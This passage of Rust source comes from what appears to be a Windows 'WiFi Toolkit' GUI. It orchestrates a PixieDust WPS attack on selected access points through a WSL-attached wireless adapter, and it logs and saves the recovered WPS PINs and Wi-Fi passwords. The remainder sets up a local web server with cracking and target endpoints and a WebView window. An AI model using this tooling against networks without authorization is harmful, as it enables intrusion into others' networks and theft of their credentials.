        (c.wsl.distro.clone(), c.wsl.pixie_timeout_sec)
    };
    let Some(iface) = st.wsl_iface.lock().unwrap().clone() else {
        events::global().push("先执行「接入网卡」");
        return;
    };
    if !wslattack::has_device(&distro) || wslattack::find_iface(&distro).is_none() {
        *st.wsl_iface.lock().unwrap() = None;
        events::global().push("网卡未就绪（可能已掉线）— 请先点「1 接入网卡」");
        return;
    }
    events::global().push(format!("PixieDust 攻击 {essid} ({bssid})，超时 {tmo}s…"));
    match wslattack::pixie(&distro, &iface, &bssid, tmo) {
        Ok(mut p) => {
            p.essid = Some(essid.clone());
            p.signal = st
                .wsl_aps
                .lock()
                .unwrap()
                .iter()
                .find(|a| a.bssid.eq_ignore_ascii_case(&bssid))
                .and_then(|a| Some(a.power));
            if p.pin.is_some() {
                events::global().push(format!(
                    "*** PixieDust 命中 {} PIN={} PSK={}（已保存） ***",
                    essid,
                    p.pin.as_deref().unwrap_or("?"),
                    p.psk.as_deref().unwrap_or("(无)")
                ));
            } else {
                events::global().push(format!("PixieDust 未命中 {bssid}（固件不易感或目标无 WPS）"));
            }
            let _ = crate::session::record_hit(&config::ensure_logs_dir(), p.clone());
            *st.pixie_out.lock().unwrap() =
                crate::session::load_hits(&config::ensure_logs_dir());
        }
        Err(e) => events::global().push(format!("PixieDust 失败: {e:#}")),
    }
}

// ── server + window ─────────────────────────────────────────────────────────

fn build_router(state: Arc<AppState>) -> Router {
    Router::new()
        .route("/", get(index))
        .route("/api/state", get(api_state))
        .route("/api/networks", get(api_networks))
        .route("/api/wsl", get(api_wsl))
        .route("/api/wsl/hide", post(api_wsl_hide))
        .route("/api/crackscope", post(api_crackscope))
        .route("/api/targets", post(api_targets))
        .route("/api/events", get(api_events))
        .route("/api/config", post(api_config_post))
        .route("/api/task", post(api_task))
        .with_state(state)
}

fn start_server(state: Arc<AppState>) -> Result<SocketAddr> {
    let (tx, rx) = std::sync::mpsc::channel::<SocketAddr>();
    let router = build_router(state);
    std::thread::spawn(move || {
        let rt = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .expect("tokio runtime");
        rt.block_on(async move {
            let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
                .await
                .expect("bind 127.0.0.1");
            let _ = tx.send(listener.local_addr().unwrap());
            if let Err(e) = axum::serve(listener, router).await {
                tracing::error!("server error: {e}");
            }
        });
    });
    rx.recv().context("server did not start")
}

/// GUI entry point: web UI in a WebView2 window. If WebView2 is unavailable,
/// print the URL and keep the server running so any browser works.
pub fn start(cfg: Config) -> Result<()> {
    let state = Arc::new(AppState::new(cfg));
    let logs_dir = config::ensure_logs_dir();
    let _ = std::fs::create_dir_all(&logs_dir);

    // periodic connection-status + adapter refresh
    {
        let st = state.clone();
        std::thread::spawn(move || loop {
            if st.busy.lock().unwrap().is_none() {
                if let Ok(i) = netsh::show_interface() {
                    *st.iface.lock().unwrap() = Some(i);
                }
                let distro = st.cfg.lock().unwrap().wsl.distro.clone();
                let (state, summary, wiface) = wsl_state_summary(&distro);
                *st.wsl_state.lock().unwrap() = state.into();
                *st.wsl_adapter.lock().unwrap() = summary;
                *st.wsl_iface.lock().unwrap() = wiface;
                *st.sessions.lock().unwrap() = crate::session::list_sessions(&config::ensure_logs_dir().join("caps"));
            }
            std::thread::sleep(Duration::from_secs(10));
        });
    }

    // Load persisted PixieDust hits so the UI shows them across restarts.
    *state.pixie_out.lock().unwrap() = crate::session::load_hits(&logs_dir);

    let addr = start_server(state.clone())?;
    let url = format!("http://{addr}/");
    events::global().push(format!("Web UI: {url}"));
    println!("web UI: {url}");

    // webview window (must be on the main thread)
    let event_loop = tao::event_loop::EventLoop::new();
    let window = tao::window::WindowBuilder::new()
        .with_title("WiFi Toolkit")
        .with_inner_size(tao::dpi::LogicalSize::new(1220.0, 820.0))
        .build(&event_loop)
        .context("create window")?;

    let webview = wry::WebViewBuilder::new()
        .with_url(&url)
        .build(&window);
    if let Err(e) = webview {
        tracing::warn!("webview unavailable ({e}); serving {url} until Ctrl+C");
        println!("WebView2 不可用，用浏览器打开 {url} 即可使用");
        loop {
            std::thread::sleep(Duration::from_secs(3600));
        }
    }

    event_loop.run(move |event, _, control| {
        if let tao::event::Event::WindowEvent {
            event: tao::event::WindowEvent::CloseRequested,
            ..
        } = event
        {
            *control = tao::event_loop::ControlFlow::Exit;
        }
    });
    std::process::exit(0);
}
